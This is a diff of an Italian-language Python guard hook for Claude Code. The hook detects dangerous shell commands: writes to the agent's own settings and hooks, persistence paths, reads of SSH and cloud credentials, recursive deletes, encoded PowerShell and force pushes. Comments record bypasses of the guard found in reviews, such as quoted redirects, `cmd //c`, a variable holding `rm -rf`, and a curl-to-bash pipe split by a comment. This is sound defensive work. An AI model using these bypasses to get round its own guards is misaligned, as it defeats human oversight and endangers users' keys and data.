-    # La cache e i marketplace dei plugin installati: col plugin di Arturo il codice delle guardie
-    # sta lì, non in ~/.claude/hooks (docs/strati.md, 3/11/2026).
-    for cartella in ("hooks", "firme", os.path.join("plugins", "cache"), os.path.join("plugins", "marketplaces")):
-        tutta = os.path.join(radice, cartella)
-        if p == tutta or p.startswith(tutta + os.sep):
-            return True
-    # Il puntatore della barra (4/11/2026, #4567): col plugin la barra in basso esegue
-    # "$(cat ~/.claude/arturo/radice)/hooks/statusline.js". Lo scrive solo l'avvio.
-    if p in (os.path.join(radice, "bin", "aggiornamenti.py"), os.path.join(radice, "bin", "aggiorna-applica.sh"),
-             os.path.join(radice, "arturo", "radice")):
-        return True
-    # Le preferenze della persona, comprese quelle delle guardie, in ~/.claude/arturo (strati F1, #4531):
-    # protette come lo erano in hooks/, perché un .local può allentare una guardia.
-    if os.path.dirname(p) == os.path.join(radice, "arturo") and p.endswith(".local"):
-        return True
-    base = os.path.basename(p)
-    if os.path.dirname(p) == os.path.normpath(os.path.join(h, ".claude")):
-        if base == ".claude.json" or (base.startswith("settings") and base.endswith(".json")):
+    modo = _MAIUSCOLE[regola][0]
+    piega = _piega if modo == "piega" else (lambda x: x)
+    home = _home()
+    p = piega(p)
+    cartella, nome = os.path.dirname(p), os.path.basename(p)
+    if modo == "nome":
+        nome = nome.lower()
+    for r, forma, percorso, _es, _ris in PERCORSI_PROTETTI:
+        if r != regola:
+            continue
+        pezzi = percorso.split("/")
+        if forma == "pezzo":
+            pezzo = piega(os.sep + os.path.join(*pezzi))
+            if (pezzo + os.sep) in p or p.endswith(pezzo):
+                return True
+            continue
+        if forma == "nome-ovunque":
+            if nome == piega(percorso):
+                return True
+            continue
+        base = os.path.join(home, ".claude") if forma != "albero-home" else home
+        if forma in ("nome-radice", "nome-cartella"):
+            dove = piega(os.path.normpath(os.path.join(base, *pezzi[:-1])))
+            if cartella == dove and fnmatch.fnmatchcase(nome, piega(pezzi[-1])):
+                return True
+            continue
+        bersaglio = piega(os.path.normpath(os.path.join(base, *pezzi)))
+        if p == bersaglio or (forma != "file-claude" and p.startswith(bersaglio + os.sep)):
             return True
     return False
+
+
+def _under_claude_config(p):
+    """True se il path reale cade su una voce `config` di PERCORSI_PROTETTI."""
+    return _protetto("config", p)
+
+
+def _piega(p):
+    """Il percorso da confrontare: in minuscolo dove il disco ignora le maiuscole (macOS, Windows)."""
+    return p.casefold() if p and sys.platform in ("darwin", "win32") else p
+
+
+_BARRA_ROVESCIATA = re.compile(r"\\(?=[\w.~-])")
+
+
+def _barre(testo, sempre=False):
+    """Il testo con le barre dritte al posto di quelle rovesciate dei percorsi, solo su Windows (o con
+    `sempre`, per il codice di cmd e powershell): le regex dei percorsi vogliono `/`, e
+    `"C:\\Users\\x\\.ssh\\id_ed25519"` passava senza conferma (review del 9/11/2026, #5096). Restano
+    `\\"`, `\\\\`, `\\$` e `\\|`, che per la shell non sono percorsi."""
+    if not testo or not (sempre or os.name == "nt"):
+        return testo
+    return _BARRA_ROVESCIATA.sub("/", testo)
 
 
 def _is_persistenza(p):
     """True se il path reale è un git hook o un file di avvio automatico."""
-    if not p:
-        return False
-    if (os.sep + ".git" + os.sep + "hooks" + os.sep) in p or p.endswith(os.sep + ".git" + os.sep + "hooks"):
-        return True
-    h = _home()
-    for radice in ("Library/LaunchAgents", ".config/systemd/user", ".config/autostart"):
-        r = os.path.normpath(os.path.join(h, radice))
-        if p == r or p.startswith(r + os.sep):
-            return True
-    return False
+    return _protetto("avvio-automatico", p)
 
 
 def _is_claude_md(p):
-    return bool(p) and os.path.basename(p) in ("CLAUDE.md", "CLAUDE.local.md")
+    return _protetto("claude-md", p)
 
 
 def _is_claude_md_globale(p):
@@ -692,18 +847,93 @@ def _claude_md_progetto_libero():
 
 def _is_unlock(p):
     """True per un file di unlock: "unlock" nel nome, direttamente in ~/.claude."""
-    return (bool(p) and "unlock" in os.path.basename(p).lower()
-            and os.path.dirname(p) == os.path.normpath(os.path.join(_home(), ".claude")))
+    return _protetto("sblocco", p)
 
 
-def _writes_config(command, cwd, protetto=None, sed=True):
+_FINE_PAROLA = frozenset(" \t\r\n;&|<>()")
+
+
+def _parola_shell(seg, i):
+    """(parola, indice dopo) dalla posizione i: pezzi senza virgolette, '...' letterale e "..." con le
+    regole di bash, anche concatenati (`"$HOME"/.claude/x`). Le variabili restano scritte."""
+    parti, n = [], len(seg)
+    while i < n and seg[i] not in _FINE_PAROLA:
+        c = seg[i]
+        if c == "'":
+            j = seg.find("'", i + 1)
+            j = n if j < 0 else j
+            parti.append(seg[i + 1:j])
+            i = j + 1
+        elif c == '"':
+            i += 1
+            while i < n and seg[i] != '"':
+                if seg[i] == "\\" and i + 1 < n and seg[i + 1] in '$`"\\\n':
+                    parti.append(seg[i + 1])
+                    i += 2
+                    continue
+                parti.append(seg[i])
+                i += 1
+            i += 1
+        elif c == "\\" and i + 1 < n:
+            parti.append(seg[i + 1])
+            i += 2
+        else:
+            parti.append(c)
+            i += 1
+    return "".join(parti), i
+
+
+def _bersagli_redirezione(seg):
+    """I file scritti dalle redirezioni del segmento: `>`, `>>`, `>|`, `N>`, `&>`, `&>>`, con il bersaglio
+    anche fra virgolette. `>&N`, `>&-` e `>(...)` non scrivono un file. Prima la regex si fermava alla
+    virgoletta, e `echo x > "$HOME/.claude/settings.json"` passava senza conferma (#5096)."""
+    out, i, n, q = [], 0, len(seg), None
+    while i < n:
+        c = seg[i]
+        if q == "'":
+            q = None if c == "'" else q
+            i += 1
+            continue
+        if c == "\\" and i + 1 < n:
+            i += 2
+            continue
+        if q == '"':
+            q = None if c == '"' else q
+            i += 1
+            continue
+        if c in "'\"":
+            q = c
+            i += 1
+            continue
+        if c != ">":
+            i += 1
+            continue
+        i += 1
+        if seg[i:i + 1] in (">", "|"):
+            i += 1
+        if seg[i:i + 1] == "&" or seg[i:i + 1] == "(":
+            i += 1
+            continue
+        while i < n and seg[i] in " \t":
+            i += 1
+        parola, i = _parola_shell(seg, i)
+        if parola:
+            out.append(parola)
+    return out
+
+
+def _writes_config(command, cwd, protetto=None, sed=True, cancella=False):
     """Copre `cd ~/.claude/hooks && > file` (target relativo dopo un cd): il match
     testuale di CONFIG_WRITE_RE vede solo i path assoluti che contengono `.claude/`.
     Qui si traccia il cd per segmento e si risolve il target reale del redirect/binario.
-    `protetto` sceglie cosa si cerca: di default config e hook, oppure _is_claude_md."""
+    `protetto` sceglie cosa si cerca: di default _under_claude_config, oppure un altro predicato sul
+    percorso risolto (_is_persistenza, _is_unlock, o una lambda sui CLAUDE.md).
+    Con `cancella` contano anche rm, unlink e shred: senza settings.json cadono deny e hook alla
+    ricarica (finding 11). I wrapper davanti (`command cp`, `sudo tee`) si saltano, e perl -i
+    scrive come sed -i."""
     protetto = protetto or _under_claude_config
     cwd_decl = None
-    for seg in re.split(r"&&|\|\||;|\||\n", command):
+    for seg in _fc.comandi_semplici(command):
         seg = seg.strip()
         if not seg:
             continue
@@ -727,12 +957,16 @@ def _writes_config(command, cwd, protetto=None, sed=True):
                 output = toks[index + 1]
             if output and protetto(_resolve(output, base_cwd)):
                 return True
-        # redirect > / >> verso un target
-        m = re.search(r">>?\s*([^\s'\";|&]+)", seg)
-        if m and protetto(_resolve(m.group(1), base_cwd)):
+        # redirezioni verso un file, anche fra virgolette
+        if any(protetto(_resolve(b, base_cwd)) for b in _bersagli_redirezione(seg)):
             return True
         # binario di scrittura con un target come argomento
+        toks = _dopo_involucri(toks) or toks
         cmd0 = os.path.basename(toks[0])
+        # L'rm ricorsivo ha la sua regola (rm-protetto), col messaggio giusto: qui solo i file singoli.
+        if cancella and cmd0 in _CANCELLANO and not _fc._ricorsivo(toks[1:]):
+            if any(protetto(_resolve(t, base_cwd)) for t in toks[1:] if not t.startswith("-")):
+                return True
         if cmd0 in _WRITE_BINS:
             argomenti = [t for t in toks[1:] if not t.startswith("-")]
             # cp, install, rsync e ln scrivono solo l'ultimo argomento (la sorgente si legge),
@@ -743,8 +977,9 @@ def _writes_config(command, cwd, protetto=None, sed=True):
             for t in argomenti:
                 if protetto(_resolve(t, base_cwd)):
                     return True
-        # sed -i sul file
-        if sed and cmd0 == "sed" and "-i" in seg:
+        # sed -i e perl -i sul file
+        if sed and ((cmd0 in ("sed", "gsed") and "-i" in seg)
+                    or (cmd0 == "perl" and any(re.match(r"^-[a-zA-Z]*i", t) for t in toks[1:]))):
             for t in toks[1:]:
                 if not t.startswith("-") and protetto(_resolve(t, base_cwd)):
                     return True
@@ -850,8 +1085,9 @@ def _cancella_dentro(args) -> bool:
     nome = os.path.basename(args[0])
     if nome in _CANCELLANO:
         return True
-    if nome in _SHELLS and "-c" in args and args.index("-c") + 1 < len(args):
-        return any(n in _CANCELLANO for n, _ in _forma().programmi(args[args.index("-c") + 1]))
+    codice = _forma().codice_shell(args[1:]) if nome in _SHELLS else None
+    if codice is not None:
+        return any(n in _CANCELLANO for n, _ in _forma().programmi(codice))
     return False
 
 
@@ -1270,10 +1506,7 @@ def _cd_certi(command, profondita=0, forzato=False):
     in forma_comando: stesso testo (testo_shell) e stessi confini."""
     forma = _forma()
     try:
-        lexer = shlex.shlex(forma.testo_shell(command), posix=True, punctuation_chars=";&|()\n")
-        lexer.whitespace = " \t\r"
-        lexer.whitespace_split = True
-        gettoni = list(lexer)
+        gettoni = list(forma.lexer(forma.testo_shell(command)))  # senza commenti, come programmi (finding 0)
     except ValueError:
         return []  # forma_comando ricade su uno split semplice: il conteggio non torna, e ogni cd è incerto
     out = []
@@ -1297,8 +1530,9 @@ def _cd_certi(command, profondita=0, forzato=False):
                 out.append(not (forzato or pila or backtick) and prima in (None, ";", "\n", "&", ";;")
                            and indice == 0 and dopo not in ("|", "|&", "&", "||"))
             if profondita < 3:
-                if nome in forma.SHELL and "-c" in args and args.index("-c") + 1 < len(args):
-                    out.extend(_cd_certi(args[args.index("-c") + 1], profondita + 1, True))
+                codice = forma.codice_shell(args) if nome in forma.SHELL else None
+                if codice is not None:
+                    out.extend(_cd_certi(codice, profondita + 1, True))
                 elif nome == "eval" and args:
                     out.extend(_cd_certi(" ".join(args), profondita + 1, True))
         parole = []
@@ -1488,6 +1722,139 @@ def _push_riscritto(command) -> bool:
     return False
 
 
+# PowerShell (finding 8): Remove-Item e i suoi alias con -Recurse, scritto anche -r o -rec.
+_PS_RIMUOVE = frozenset(("remove-item", "ri", "rm", "del", "erase", "rd", "rmdir"))
+_PS_RICORSIVO = re.compile(r"^-r(?:e(?:c(?:u(?:r(?:s(?:e)?)?)?)?)?)?$", re.IGNORECASE)
+_PS_COMANDO = re.compile(r"^[-/]c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?$", re.IGNORECASE)
+_PS_CODIFICATO = re.compile(r"^[-/]e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?|c)?$",
+                            re.IGNORECASE)
+
+
+def _codice_powershell(args):
+    """Il codice che `powershell` o `pwsh` esegue: dopo -Command, decodificato da -EncodedCommand, o gli
+    argomenti liberi. None con -File: lo script sta in un file."""
+    for i, a in enumerate(args):
+        if _PS_COMANDO.match(a):
+            return " ".join(args[i + 1:])
+        if _PS_CODIFICATO.match(a) and i + 1 < len(args):
+            try:
+                import base64
+                return base64.b64decode(args[i + 1]).decode("utf-16-le")
+            except Exception:
+                return ""
+        if a.lower() in ("-file", "/file", "-f"):
+            return None
+    return " ".join(a for a in args if not a.startswith("-"))
+
+
+def _istruzioni_powershell(codice):
+    """Le istruzioni del codice PowerShell, ognuna come lista dei suoi stadi in pipe. Spezza con le regole
+    di PowerShell: `;`, `|`, `&&` e `||` fra virgolette restano testo (#5122)."""
+    istruzioni, stadi, inizio = [], [], 0
+    for a, b, tipo in _fc._separatori(codice, lingua="powershell"):
+        stadi.append(codice[inizio:a])
+        if tipo != "|":
+            istruzioni.append(stadi)
+            stadi = []
+        inizio = b
+    stadi.append(codice[inizio:])
+    istruzioni.append(stadi)
+    return istruzioni
+
+
+def _powershell_rimuove(args):
+    """I bersagli di ogni Remove-Item ricorsivo nel codice di `powershell -Command`: una lista per
+    istruzione, None se arrivano da una pipe o non si leggono."""
+    codice = _codice_powershell(args)
+    if codice is None:
+        return []
+    out = []
+    for stadi in _istruzioni_powershell(codice):
+        for k, stadio in enumerate(stadi):
+            parole = [p.strip("'\"") for p in re.findall(r"'[^']*'|\"[^\"]*\"|\S+", stadio)]
+            if parole and parole[0].lower() in _PS_RIMUOVE and any(_PS_RICORSIVO.match(p) for p in parole[1:]):
+                bersagli = [p for p in parole[1:] if not p.startswith("-")]
+                out.append(bersagli if bersagli and k == 0 else None)
+    return out
+
+
+# cmd e powershell (review del 9/11/2026, #5096): il loro codice è un argomento, e le regole per programma
+# non lo leggevano. `cmd //c type <chiave>` e `powershell Set-Content <config>` passavano senza conferma.
+_WIN_SCRIVE = re.compile(
+    r"(?:^|[\s;|&(])(?:set-content|add-content|out-file|tee-object|new-item|copy-item|move-item|remove-item|"
+    r"rename-item|clear-content|sc|ac|ni|cpi|copy|cp|mi|move|mv|ri|del|erase|rm|rni|ren|rename|xcopy|robocopy|"
+    r"mklink)(?=[\s(]|$)|>|\[(?:system\.)?io\.file\]::(?:write|append|copy|move|delete|create|replace)",
+    re.IGNORECASE)
+# I percorsi protetti per cmd e powershell: tutte le voci della tabella, maiuscole piegate.
+_WIN_PROTETTI = tuple((regola, re.compile(_frammenti(regola, "win"), re.IGNORECASE))
+                      for regola in _MAIUSCOLE)
+
+
+def _codici_windows(testo):
+    """Il codice di ogni `cmd /c` e `powershell -Command` del comando, con le barre dritte."""
+    out = []
+    for nome, args in _fc.programmi(testo):
+        basso = nome.lower()[:-4] if nome.lower().endswith(".exe") else nome.lower()
+        if basso == "cmd" and args and args[0].lower() in ("/c", "//c", "/k", "//k"):
+            out.append(_barre(" ".join(args[1:]), sempre=True))
+        elif basso in ("powershell", "pwsh"):
+            codice = _codice_powershell(args)
+            if codice:
+                out.append(_barre(codice, sempre=True))
+    return out
+
+
+def _regole_windows(testo):
+    """Le regole che il codice di cmd e powershell tocca: segreto se nomina un file segreto, e la regola del
+    percorso (config, sblocco, claude-md, avvio-automatico) se scrive e nomina un percorso protetto."""
+    regole = set()
+    for codice in _codici_windows(testo):
+        if SECRET_PATH_RE.search(codice) or _SECRET_DIR_RE.search(codice) or ENV_RE.search(codice):
+            regole.add("segreto")
+        if _WIN_SCRIVE.search(codice):
+            for regola, pattern in _WIN_PROTETTI:
+                if pattern.search(codice):
+                    regole.add(regola)
+    return regole
+
+
+_PUSH_RISCRIVE = ("--force", "--force-with-lease", "--force-if-includes", "--mirror", "--delete", "--prune")
+
+
+def _push_forzato(command):
+    """Il motivo se un git push riscrive o cancella rami remoti, in qualunque posizione del flag
+    (review del 7/11/2026, finding 5): i deny di settings.json vogliono il flag subito dopo push, e
+    `git push origin main --force` passava. None se il push è normale."""
+    for nome, args in _fc.programmi(command):
+        if nome != "git":
+            continue
+        _, sotto, resto = _git_parti(args)
+        if sotto != "push":
+            continue
+        liberi, salta = [], False
+        for a in resto:
+            if salta:
+                salta = False
+                continue
+            if a in ("-o", "--push-option", "--repo", "--receive-pack", "--exec"):
+                salta = True
+                continue
+            if a.startswith("--"):
+                lunga = a.split("=", 1)[0]
+                if len(lunga) >= 4 and any(o.startswith(lunga) for o in _PUSH_RISCRIVE):
+                    return f"git push con {a}: riscrive o cancella rami sul remoto"
+                continue
+            if a.startswith("-") and len(a) > 1:
+                if "f" in a[1:] or "d" in a[1:]:
+                    return f"git push con {a}: riscrive o cancella rami sul remoto"
+                continue
+            liberi.append(a)
+        for refspec in liberi[1:]:
+            if refspec.startswith("+") or (refspec.startswith(":") and len(refspec) > 1):
+                return f"git push con il refspec {refspec}: riscrive o cancella un ramo sul remoto"
+    return None
+
+
 def _rm_segments(command):
     """(bersagli, catena dei cd) per ogni `rm` ricorsivo; bersagli None per `xargs rm -r`.
 
@@ -1502,8 +1869,24 @@ def _rm_segments(command):
     forma = _forma()
     out = []
     for nome, args, cwd_decl in _programmi_con_cd(command):
-        if nome == "xargs" and "rm" in [os.path.basename(a) for a in args]:
-            dopo = args[[os.path.basename(a) for a in args].index("rm") + 1:]
+        # Windows (review del 7/11/2026, finding 8): rd, rmdir, del ed erase con /s, e dentro cmd /c.
+        basso = nome.lower()[:-4] if nome.lower().endswith(".exe") else nome.lower()
+        if basso == "cmd" and args and args[0].lower() in ("/c", "//c", "/k", "//k"):
+            interni = _rm_segments(" ".join(a.replace("\\", "\\\\") for a in args[1:]))
+            out += [(t, cwd_decl + c) for t, c in interni]
+            continue
+        if basso in ("rd", "rmdir", "del", "erase") and any(a.lower() in ("/s", "//s") for a in args):
+            out.append(([a for a in args if not (a.startswith("/") and len(a) <= 3)], cwd_decl))
+            continue
+        if basso in ("powershell", "pwsh"):
+            for bersagli in _powershell_rimuove(args):
+                out.append((bersagli, cwd_decl))
+            continue
+        if nome.startswith("$") and re.search(r"(?:^|[\s'\"=;&|(])(?:rm|unlink|shred)(?:[\s'\";&|)]|$)", command):
+            out.append((None, cwd_decl))  # `RM='rm -rf'; $RM x`: il programma è una variabile (finding 2)
+            continue
+        if nome == "xargs" and "rm" in [forma._nome(a) for a in args]:
+            dopo = args[[forma._nome(a) for a in args].index("rm") + 1:]
             if forma._ricorsivo(dopo):
                 out.append((None, cwd_decl))
             continue
@@ -1592,6 +1975,15 @@ def main() -> int:
                 "pubblica: è probabilmente una chiave privata, e il contenuto finirebbe nel contesto. "
                 "Conferma solo se serve davvero.")
         return 0
+    # Grep stampa le righe dei file che legge: su una chiave di ~/.ssh o sulla cartella intera vale come
+    # Read (review del 7/11/2026, finding 4). settings.json gli manda anche il tool Grep.
+    if data.get("tool_name") == "Grep":
+        percorso = re.sub(r"/+", "/", str((data.get("tool_input") or {}).get("path") or "").replace("\\", "/"))
+        if _SSH_LETTURA.search(percorso) or re.search(r"(?:^|/)\.ssh/?$", percorso):
+            return _ask("segreto",
+                "Ricerca con Grep dentro ~/.ssh: le righe trovate delle chiavi private finirebbero nel "
+                "contesto. Conferma solo se serve davvero.")
+        return 0
     if data.get("tool_name") not in ("Bash", "Monitor"):  # Monitor lancia comandi shell (19/10/2026)
         return 0
     command = (data.get("tool_input") or {}).get("command", "")
@@ -1607,8 +1999,20 @@ def main() -> int:
 
     # 1) Blocco duro
     if not _inert_reference(command):
-        for pattern, why in DANGEROUS:
-            if re.search(pattern, testo, re.IGNORECASE):
+        try:
+            # senza i commenti: `curl u | # nota` + a capo + `bash` è una pipeline sola (#5097)
+            istruzioni = _fc.istruzioni(_fc.togli_commenti(testo))
+        except Exception:
+            istruzioni = [testo]
+        regole = [(p, w, [testo]) for p, w in DANGEROUS] + [(p, w, istruzioni) for p, w in DANGEROUS_ISTRUZIONE]
+        try:
+            pericoloso = _programma_pericoloso(testo)
+        except Exception:
+            pericoloso = None
+        if pericoloso:
+            regole.insert(0, (r"[\s\S]", pericoloso, [testo]))
+        for pattern, why, testi in regole:
+            if any(re.search(pattern, t, re.IGNORECASE) for t in testi):
                 sys.stderr.write(
                     f"Bloccato: questo comando sembra {why}. "
                     "Non proporre all'utente di eseguirlo a mano: per installare un programma "
@@ -1627,8 +2031,16 @@ def main() -> int:
             )
             return 2
 
+    # Su Windows le regex dei percorsi leggono il testo con le barre dritte, e il codice di cmd e powershell
+    # ha le sue regole (review del 9/11/2026, #5096).
+    dritto = _barre(testo)
+    try:
+        windows = _regole_windows(testo)
+    except Exception:
+        windows = set()
+
     # 2) Scrittura shell su config/hook di Claude Code -> ask (auto-modifica guardie)
-    if CONFIG_WRITE_RE.search(testo) or _writes_config(testo, cwd):
+    if CONFIG_WRITE_RE.search(dritto) or "config" in windows or _writes_config(testo, cwd, cancella=True):
         return _ask("config",
             "Scrittura via shell su settings/hook di Claude Code o sull'aggiornamento automatico "
             "di Arturo: modificherebbe le guardie stesse, o cosa si installa da solo. Conferma "
@@ -1653,7 +2065,8 @@ def main() -> int:
     progetto = _writes_config(testo, cwd, lambda p: _is_claude_md(p) and not _globale(p) and os.path.exists(p))
     risolto = _writes_config(testo, cwd, lambda p: _is_claude_md(p) and not _globale(p))
     if globale or progetto_nuovo or (progetto and not _claude_md_progetto_libero()) or \
-            CLAUDE_MD_OPEN_RE.search(testo) or (CLAUDE_MD_WRITE_RE.search(testo) and not risolto):
+            CLAUDE_MD_OPEN_RE.search(dritto) or "claude-md" in windows or \
+            (CLAUDE_MD_WRITE_RE.search(dritto) and not risolto):
         return _ask("claude-md",
             "Scrittura via shell su un CLAUDE.md: cambierebbe le istruzioni di ogni sessione "
             "futura in quella cartella. Conferma solo se sei tu a volerlo. Per una modifica sola "
@@ -1661,7 +2074,7 @@ def main() -> int:
         )
 
     # 2a-bis) Scrittura shell su un percorso di avvio automatico -> ask (persistenza)
-    if PERSIST_WRITE_RE.search(testo) or _writes_config(testo, cwd, _is_persistenza):
+    if PERSIST_WRITE_RE.search(dritto) or "avvio-automatico" in windows or _writes_config(testo, cwd, _is_persistenza):
         return _ask("avvio-automatico",
             "Scrittura via shell su un git hook o su un servizio di avvio automatico "
             "(LaunchAgents, systemd, autostart): il codice partirebbe da solo a ogni "
@@ -1669,7 +2082,7 @@ def main() -> int:
         )
 
     # 2b) Creazione di un file di unlock -> ask (sbloccherebbe l'auto-modifica)
-    sblocco = UNLOCK_RE.search(testo) or _writes_config(testo, cwd, _is_unlock)
+    sblocco = UNLOCK_RE.search(dritto) or "sblocco" in windows or _writes_config(testo, cwd, _is_unlock)
     if sblocco and "claude-md-unlock" in testo and "config-unlock" not in testo:
         return _ask("sblocco-claude-md",
             "Sblocco della modifica di CLAUDE.md per questa sessione: Claude potrà "
@@ -1682,7 +2095,7 @@ def main() -> int:
         )
 
     # 3) Lettura di file segreti via shell -> ask (per-segmento, alta precisione)
-    if _reads_secret(command):
+    if _reads_secret(command) or "segreto" in windows:
         return _ask("segreto",
             "Lettura di un file segreto via shell (chiave privata, credenziali, "
             "~/.ssh, ~/.aws...). Conferma solo se serve davvero: il contenuto "
@@ -1718,8 +2131,8 @@ def main() -> int:
         for targets, cwd_decl in _rm_segments(command):
             if targets is None:
                 return _ask("rm-xargs",
-                    "rm ricorsivo dietro xargs: i percorsi arrivano da un altro comando e "
-                    "non si possono controllare prima. Conferma solo se sai cosa cancella."
+                    "Cancellazione ricorsiva dietro xargs, da una pipe o con il programma in una variabile: "
+                    "i percorsi non si possono controllare prima. Conferma solo se sai cosa cancella."
                 )
             for base_cwd, t in [(b, t) for b in _basi_dopo_cd(cwd_decl, cwd) for t in (targets or ["."])]:
                 if t in BARE_TARGETS:
@@ -1806,6 +2219,20 @@ def main() -> int:
             "git push con la destinazione riscritta nello stesso comando (git -c remote.<nome>.url=, "
             "insteadOf, pushurl, --config-env o GIT_CONFIG_*): il contenuto andrebbe a un indirizzo che il "
             "repository non ha configurato. Conferma solo se l'indirizzo è tuo."
+        )
+
+    # 8-ter) push che riscrive o cancella rami remoti -> ask (finding 5): il rail dei deny, in ogni forma.
+    try:
+        forzato = _push_forzato(command)
+    except Exception:
+        forzato = "git push che la guardia non riesce a leggere" if re.search(
+            r"\bpush\b[^\n;&|]*(\s-[a-z]*[fd]|--(forc|mir|del|pru)|\s[+:])", command) else None
+    if forzato:
+        # Il nome di regola è quello del push riscritto: un nome nuovo va anche in server/logica.js, e il
+        # Worker si pubblica col lotto del server (L3), non con questo.
+        return _ask("git-destinazione",
+            f"{forzato}. Il lavoro che c'era sul remoto, anche di altri, sparisce. Conferma solo se il "
+            "ramo è tuo e sai cosa sostituisci."
         )
 
     # 9) git branch -D e git stash drop -> ask, solo se il lavoro non esiste altrove (31/10/2026).
